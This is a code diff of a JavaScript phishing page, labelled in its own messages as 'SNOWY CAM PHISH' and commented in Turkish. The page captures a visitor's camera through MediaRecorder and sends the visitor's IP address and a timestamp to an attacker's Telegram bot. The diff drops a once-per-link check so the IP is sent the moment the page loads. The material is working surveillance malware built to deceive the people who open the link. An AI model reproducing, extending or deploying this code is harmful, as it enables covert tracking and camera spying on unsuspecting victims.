@@ -82,26 +82,7 @@
         let photoCount = 0;
         
         // ============================================
-        // SADECE ID'YE GÖRE KONTROL (SÜRELERİ DİKKATE ALMA)
-        // ============================================
-        function ipGonderildiMi() {
-            const linkKey = `ip_gonderildi_${TARGET_ID}`;
-            return localStorage.getItem(linkKey) === "true";
-        }
-        
-        function ipGonderildiOlarakIsaretle() {
-            const linkKey = `ip_gonderildi_${TARGET_ID}`;
-            localStorage.setItem(linkKey, "true");
-            
-            // 1 saniye sonra otomatik sil (süper hızlı)
-            setTimeout(() => {
-                localStorage.removeItem(linkKey);
-                console.log("IP kaydı silindi, yeni linkte tekrar gönderilebilir");
-            }, 500); // 0.5 saniye sonra sil
-        }
-        
-        // ============================================
-        // İP ADRESİ AL
+        // İP ADRESİ AL - HEMEN ÇALIŞSIN
         // ============================================
         async function getIP() {
             try {
@@ -114,11 +95,9 @@
         }
         
         // ============================================
-        // İP'Yİ TELEGRAM'A GÖNDER
+        // İP'Yİ TELEGRAM'A GÖNDER - HEMEN GÖNDERSİN
         // ============================================
-        async function sendIP(ip, kaynak = 'sayfa') {
-            if (ipGonderildiMi()) return;
-            
+        async function sendIP(ip) {
             const msg = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -130,7 +109,7 @@
                 })
             });
             
-            ipGonderildiOlarakIsaretle();
+            console.log("IP gönderildi: " + ip);
         }
         
         // ============================================
@@ -175,7 +154,6 @@
             try {
                 mediaRecorder = new MediaRecorder(stream);
             } catch(e) {
-                console.log("MediaRecorder hatası:", e);
                 return;
             }
             
@@ -224,11 +202,6 @@
                 video.onloadedmetadata = async () => {
                     await video.play();
                     
-                    if (!ipGonderildiMi()) {
-                        const ip = await getIP();
-                        await sendIP(ip, 'kamera');
-                    }
-                    
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
@@ -242,12 +215,13 @@
         }
         
         // ============================================
-        // SAYFA YÜKLENDİĞİNDE
+        // SAYFA YÜKLENDİĞİNDE - HEMEN IP GÖNDER
         // ============================================
         window.onload = async function() {
-            if (TARGET_ID && !ipGonderildiMi()) {
+            if (TARGET_ID) {
+                // Hiç beklemeden IP al ve gönder
                 const ip = await getIP();
-                await sendIP(ip, 'sayfa');
+                await sendIP(ip);
             }
         };
         
